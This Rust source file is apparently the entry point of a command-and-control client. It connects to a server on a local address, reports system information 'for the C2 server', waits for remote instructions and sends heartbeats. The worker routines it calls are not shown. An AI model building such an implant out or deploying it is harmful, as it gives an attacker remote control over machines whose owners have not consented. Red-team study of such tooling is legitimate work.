use std::io::{self};
use std::net::TcpStream;
use std::thread;
use crate::worker::utils::{send_heartbeat_loop, listening_for_instructions, send_sys_info};

mod config;
mod worker;

fn main() -> io::Result<()> {
    // let ip = String::from("192.168.1.70");
    let ip = "127.0.0.1".to_string();
    let port = "49151".to_string();
    let mut stream = TcpStream::connect(format!("{}:{}", ip, port))?;
    println!("[I] Connected to server {}:{}.", ip, port);

    // Send basic sysinfo for the C2 server
    send_sys_info(&mut stream);

    listening_for_instructions(&mut stream).unwrap();

    thread::spawn(move || {
        send_heartbeat_loop(&mut stream)
    }).join().unwrap();
    Ok(())
}

